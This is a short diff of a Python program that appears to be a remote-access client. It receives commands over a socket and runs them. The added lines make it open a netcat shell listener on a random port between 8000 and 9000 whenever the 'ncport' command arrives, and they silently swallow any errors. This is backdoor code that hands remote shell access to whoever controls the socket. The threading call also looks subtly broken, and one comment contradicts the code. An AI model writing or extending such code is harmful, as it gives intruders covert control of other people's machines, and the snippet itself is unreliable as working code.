@@ -203,7 +203,16 @@ while True:
                 s.send("NO_DEPENDENCIES".encode())
         
         elif command == "ncport":
-            s.send(str(NCPORT).encode())
+            s.send(str(NCPORT).encode()) #Send the user the current NC port then open another one
+            NCPORT = random.randint(8000,9000) #Picks a random port between 8000-9000
+            if NCPORT == 8080:
+                NCPORT = 8081
+            #Assume the client has netcat installed. If they don't, then just skip this step.
+            try:
+                tty = Thread(startTTY(NCPORT)) #Start netcat shell listening on 8081
+                tty.start() #Start the thread
+            except:
+                pass
 
         else: #if the user doesn't want to perform a special action, run the command and capture the output
             #if the command runs for longer than 5 seconds, timeout
